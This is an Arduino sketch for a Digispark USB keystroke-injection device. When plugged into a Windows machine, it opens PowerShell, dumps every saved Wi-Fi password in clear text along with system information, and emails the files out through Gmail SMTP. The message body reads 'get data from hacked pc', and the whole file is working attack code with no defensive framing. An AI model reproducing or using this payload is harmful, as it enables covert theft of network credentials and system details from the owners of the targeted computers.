#define kbd_tr_tr
#include "DigiKeyboard.h"

int limit = 1;
int current = 0;


void setup() {

  pinMode(0, OUTPUT); //LED on Model B
  pinMode(1, OUTPUT); //LED on Model A  or Pro

  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(200);
}

void loop() {

  if (limit > current) {

    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(200);
    DigiKeyboard.print("powershell");
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(200);

    //saveInfo
    DigiKeyboard.print("netsh wlan show profile name=\'*\' key=clear > pass.txt");
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(200);
    DigiKeyboard.print("systeminfo > sysinfo.txt");
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(200);

    //sendMail
    DigiKeyboard.print(F("$Message = New-Object System.Net.Mail.MailMessage 'sendermail@gmail.com','recipientmail@outlook.com'"));
    DigiKeyboard.delay(1000);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(200);
    DigiKeyboard.print("$Message.Subject = 'Get Info For Digi'");
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(200);
    DigiKeyboard.print("$Message.Body = 'get data from hacked pc'");
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(200);
    DigiKeyboard.print("$Message.Attachments.Add('sysinfo.txt')");
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(200);
    DigiKeyboard.print("$Message.Attachments.Add('pass.txt')");
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(200);
    DigiKeyboard.print("$Smtp = New-Object Net.Mail.SmtpClient('smtp.gmail.com', '587')");
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(200);
    DigiKeyboard.print("$Smtp.EnableSsl = $true");
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(200);
    DigiKeyboard.print(F("$Smtp.Credentials = New-Object System.Net.NetworkCredential('yourgmail@gmail.com', 'password')"));
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(200);
    DigiKeyboard.print("$Smtp.Send($Message)");
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(200);
    DigiKeyboard.print("exit");
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    //isFinish
    digitalWrite(0, HIGH);   // turn the LED on (HIGH is the voltage level)
    digitalWrite(1, HIGH);
   
   
    current = current + 1;

    
  }

}
